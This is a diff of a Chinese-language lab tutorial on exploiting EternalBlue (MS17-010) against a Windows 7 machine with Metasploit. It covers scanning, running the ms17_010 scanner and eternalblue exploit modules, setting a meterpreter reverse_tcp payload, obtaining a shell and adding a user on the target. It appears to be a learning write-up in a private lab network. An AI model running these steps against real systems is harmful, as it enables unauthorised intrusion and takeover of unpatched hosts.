@@ -2,23 +2,48 @@
 
 
 
-
-
--   查看主机以及肉鸡的IP地址并能ping通
-    -   得到主机的IP地址为192.168.107.130 肉鸡的IP地址为192.168.107.131
+-   查询自身IP
+    ![image-20201126135135195](利用永恒之蓝漏洞实施对win7的攻击.assets/image-20201126135135195.png)
+-   使用nmap进行IP扫描并确定系统类型
+    ![image-20201126140935447](利用永恒之蓝漏洞实施对win7的攻击.assets/image-20201126140935447.png)
+-   查看主机系统类型并能ping通
+    ![image-20201126140908759](利用永恒之蓝漏洞实施对win7的攻击.assets/image-20201126140908759.png)
 -   查看数据库状态service postgresql status
+    ![image-20201126135555788](利用永恒之蓝漏洞实施对win7的攻击.assets/image-20201126135555788.png)
     -   如果没有打开则启动数据库service postgresql start
     -   再次查看状态 active即可
--   msfdb初始化数据库: msfdb init 需要使用root权限
+-   msfdb初始化数据库: msfdb init 需要使用root权限(我这里已经初始化了)
+    ![image-20201126135636893](利用永恒之蓝漏洞实施对win7的攻击.assets/image-20201126135636893.png)
 -   启动msfconsole
+    ![image-20201126135744720](利用永恒之蓝漏洞实施对win7的攻击.assets/image-20201126135744720.png)
     -   查看数据库状态db_status
+        ![image-20201126135758610](利用永恒之蓝漏洞实施对win7的攻击.assets/image-20201126135758610.png)
 -   搜索ms17_010(永恒之蓝漏洞): search ms17_010
--   进行漏洞扫描use auxiliary/scanner/smb/smb_ms17_010
+    ![image-20201126135835823](利用永恒之蓝漏洞实施对win7的攻击.assets/image-20201126135835823.png)
+-   使用auxiliary/scanner/smb/smb_ms17_010
+    ![image-20201126135951558](利用永恒之蓝漏洞实施对win7的攻击.assets/image-20201126135951558.png)
     -   查看需要的命令使用options获取帮助
--   设置扫描的主机或者主机段
-    -   设置靶机 set rhosts 肉鸡IP/24
-    -   设置线程 set threads 线程数
--   打开wireshark抓包工具监听eth0 run
--   设置用什么进行攻击 use exploit/windows/smb/ms17_010_eternalblue
--   设置攻击载荷 set payload windows/x64/meterpreter/reverse_tcp
--   设置监听主机 lhost: set lhost 主机IP地址
+        ![image-20201126140211387](利用永恒之蓝漏洞实施对win7的攻击.assets/image-20201126140211387.png)
+    -   使用set命令设置参数
+        ![image-20201126141112965](利用永恒之蓝漏洞实施对win7的攻击.assets/image-20201126141112965.png)
+    -   使用run进行执行 发现有漏洞
+        ![image-20201126141157735](利用永恒之蓝漏洞实施对win7的攻击.assets/image-20201126141157735.png)
+-   使用攻击模块 exploit/windows/smb/ms17_010_eternalblue   (也就是永恒之蓝)
+    ![image-20201126141406357](利用永恒之蓝漏洞实施对win7的攻击.assets/image-20201126141406357.png)
+    -   查看对应参数
+        ![image-20201126141543358](利用永恒之蓝漏洞实施对win7的攻击.assets/image-20201126141543358.png)
+    -   设置对应参数
+        ![image-20201126141625370](利用永恒之蓝漏洞实施对win7的攻击.assets/image-20201126141625370.png)
+    -   进行攻击 得到WIN即可
+        ![image-20201126141712517](利用永恒之蓝漏洞实施对win7的攻击.assets/image-20201126141712517.png)
+-   获得目标主机控制权限
+    -   使用help命令获取命令即解释
+        ![image-20201126141844709](利用永恒之蓝漏洞实施对win7的攻击.assets/image-20201126141844709.png)
+    -   获得目标主机的控制台 这样就可以操作了
+        ![image-20201126141928099](利用永恒之蓝漏洞实施对win7的攻击.assets/image-20201126141928099.png)
+    -   乱码解决
+        ![image-20201126142142713](利用永恒之蓝漏洞实施对win7的攻击.assets/image-20201126142142713.png)
+    -   查看已经有的用户
+        
+    -   添加用户
+        ![image-20201126142644850](利用永恒之蓝漏洞实施对win7的攻击.assets/image-20201126142644850.png)
